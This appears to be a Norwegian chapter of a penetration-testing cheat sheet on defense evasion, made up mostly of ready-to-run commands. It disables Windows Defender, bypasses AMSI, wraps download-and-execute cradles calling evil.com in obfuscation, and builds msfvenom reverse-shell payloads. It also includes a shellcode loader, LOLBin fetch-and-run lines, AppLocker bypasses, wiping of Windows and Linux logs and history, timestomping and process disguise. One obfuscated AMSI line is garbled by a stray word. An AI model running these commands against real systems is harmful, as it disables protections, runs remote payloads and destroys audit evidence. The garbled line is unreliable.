# 🛡️ Fase 6: Omgåelse av sikkerhetsmekanismer

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](06-Defense-Evasion.tr.md) • [🇬🇷 Ελληνικά](06-Defense-Evasion.el.md)

```
  ██████╗ ███████╗███████╗███████╗███╗   ██╗███████╗███████╗
  ██╔══██╗██╔════╝██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██║  ██║█████╗  █████╗  █████╗  ██╔██╗ ██║███████╗█████╗  
  ██║  ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██╔══╝  
  ██████╔╝███████╗██║     ███████╗██║ ╚████║███████║███████╗
  ╚═════╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝
        ███████╗██╗   ██╗ █████╗ ███████╗██╗ ██████╗ ███╗   ██╗
        ██╔════╝██║   ██║██╔══██╗██╔════╝██║██╔═══██╗████╗  ██║
        █████╗  ██║   ██║███████║███████╗██║██║   ██║██╔██╗ ██║
        ██╔══╝  ╚██╗ ██╔╝██╔══██║╚════██║██║██║   ██║██║╚██╗██║
        ███████╗ ╚████╔╝ ██║  ██║███████║██║╚██████╔╝██║ ╚████║
        ╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

**Mål:** Omgå sikkerhetsmekanismer (antivirus, EDR, AMSI og brannmurer) for å unngå å bli oppdaget.

---

## 🛡️ Omgåelse av Windows Defender

### Deaktivere Windows Defender (krever administrator)

> **Versjonsmerknad:** Administratorrettigheter er ikke tilstrekkelig i alle miljøer. Tamper protection kan blokkere endringer i Defender-innstillinger, også når kommandoer ser ut til å lykkes. Se [Microsofts dokumentasjon](https://learn.microsoft.com/en-us/defender-endpoint/tamper-protection-overview).
```powershell
# Deaktiver sanntidsovervåking
Set-MpPreference -DisableRealtimeMonitoring $true

# Deaktiver alle Defender-funksjoner
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScriptScanning $true

# Legg til unntaksstier
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionProcess "powershell.exe"

# Via registeret
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

### Kontrollere Defender-status
```powershell
Get-MpComputerStatus
Get-MpPreference
```

---

## 🔓 Omgåelse av AMSI

### Omgåelse av AMSI i PowerShell
```powershell
# Omgåelse 1 – amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Omgåelse 2 – Matt Graebers enlinjekommando
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)

# Omgåelse 3 – endring av minne
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### Tilslørt omgåelse av AMSI

> **Merknad til originalen:** Formatstrengen inneholder `{3}`, men bare tre formatargumenter. Eksemplet er derfor feilformet som skrevet. Koden er bevart for samsvar med originalen; disse eldre AMSI-eksemplene er heller ingen garanti for omgåelse.
```powershell
# Tilsløring av strenger
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0telekinetic1}{2}i{3}' -f $a,$b,$u))
$field = $assembly.GetField(('a]ot>m]ot>siInitFailed' -replace ']ot>',''),'NonPublic,Static')
$field.SetValue($null,$true)
```

---

## 📦 Tilsløring av payloads

### Tilsløring av PowerShell-kode
```powershell
# Base64-koding
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded

# Sammenkjeding av strenger
$a = 'Down'; $b = 'loadString'
(New-Object Net.WebClient)."$a$b"('http://evil.com/payload.ps1') | IEX

# Invoke-Obfuscation
Invoke-Obfuscation -ScriptPath payload.ps1 -Command 'TOKEN\ALL\1' -Quiet
```

### Tilsløring av binærfiler
```bash
# Koding med msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe > payload.exe

# Egendefinert XOR
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw | python3 xor_encrypt.py > payload.bin

# Shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

### Shellcode-lastere

> **Merknad:** C-eksemplet er et ufullstendig utdrag med en avkortet shellcode-streng, ikke et selvstendig kompilerbart program.
```c
// Enkel shellcode-laster i C
unsigned char shellcode[] = "\xfc\x48\x83...";

int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

---

## 🎭 Living off the land (LOLBins – bruk av innebygde verktøy)

### Laste ned og kjøre
```cmd
# certutil
certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
certutil -decode encoded.txt payload.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\temp\payload.exe

# curl (Windows 10+)
curl http://evil.com/payload.exe -o C:\temp\payload.exe

# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe','C:\temp\payload.exe')"
Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\temp\payload.exe
```

### Kjøre payloads
```cmd
# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(payload)")

# mshta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(payload)"", 0:close")
mshta http://evil.com/payload.hta

# regsvr32
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll

# wmic
wmic process call create "powershell -ep bypass -c IEX(payload)"

# msiexec
msiexec /q /i http://evil.com/payload.msi
```

### Omgåelse av AppLocker/WDAC
```cmd
# installutil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# regasm
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# msbuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

---

## 🔒 Omgåelse av ETW og logging

### Deaktivere hendelsessporing

> **Presisering:** Koden nedenfor deklarerer en ekstern `EtwEventWrite`-funksjon og laster en type. Den endrer ingen funksjonskode og deaktiverer ikke ETW som skrevet.
```powershell
# Endre ETW i minnet
$patch = @"
using System;
using System.Runtime.InteropServices;
public class Etw {
    [DllImport("ntdll.dll")]
    public static extern int EtwEventWrite(long x, long y, long z, long q);
}
"@
Add-Type $patch
```

### Tømme hendelseslogger
```powershell
# Tøm alle logger
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# PowerShell
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }

# Eller deaktiver logging
auditpol /clear /y
```

### Deaktivere PowerShell-logging
```powershell
# Deaktiver Script Block Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Deaktiver modullogging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0
```

---

## 🐧 Omgåelse av sikkerhetsmekanismer i Linux

### Timestomping (endring av tidsstempler)
```bash
# Endre filenes tidsstempler
touch -r /etc/passwd malicious.sh
touch -d "2020-01-01 12:00:00" malicious.sh
```

### Tømme logger
```bash
# Tøm bash-historikken
history -c
cat /dev/null > ~/.bash_history
export HISTSIZE=0
unset HISTFILE

# Tøm systemlogger
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
echo > /var/log/messages
```

### Skjule prosesser
```bash
# Skjul prosessnavnet
exec -a "[kworker/0:0]" ./malicious

# Skjuling med LD_PRELOAD
# Kompiler et bibliotek som avskjærer readdir() for å skjule prosesser
```

---

## 🛠️ Verktøy

| Verktøy | Formål |
|------|---------|
| **Invoke-Obfuscation** | Tilsløring av PowerShell-kode |
| **Veil** | Generering av payloads |
| **ScareCrow** | Payload-generator for omgåelse av EDR |
| **Donut** | Shellcode-generator |
| **Nimcrypt2** | PE-pakker |
| **PEzor** | PE-shellcode-laster |

---

## 📊 Hurtigreferanse

### Deteksjonsmetoder og omgåelse

| Deteksjon | Omgåelsesteknikk |
|-----------|------------------|
| Signaturbasert | Tilsløring og koding |
| AMSI | Endring av minne og omgåelsesskript |
| ETW | Endring av ETW i minnet |
| Logging | Deaktivere logging og tømme logger |
| AppLocker | LOLBins og stier som omgår reglene |
| Atferd | Bruk av innebygde verktøy |

### Hurtigliste over LOLBins

| Binærfil | Bruk |
|--------|-----|
| certutil | Laste ned filer |
| bitsadmin | Laste ned filer |
| mshta | Kjøre HTA |
| rundll32 | Kjøre DLL/JS |
| regsvr32 | Kjøre SCT |
| msbuild | Kjøre XML |
| installutil | Kjøre EXE |

---

## 🔗 Relaterte hurtigguider

- [PowerShell](../../PowerShell/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

**Forrige fase:** [← 05 - Vedvarende tilgang](./05-Persistence.nb.md)

**Neste fase:** [07 - Gjennomføring av målene →](./07-Actions-Objectives.nb.md)
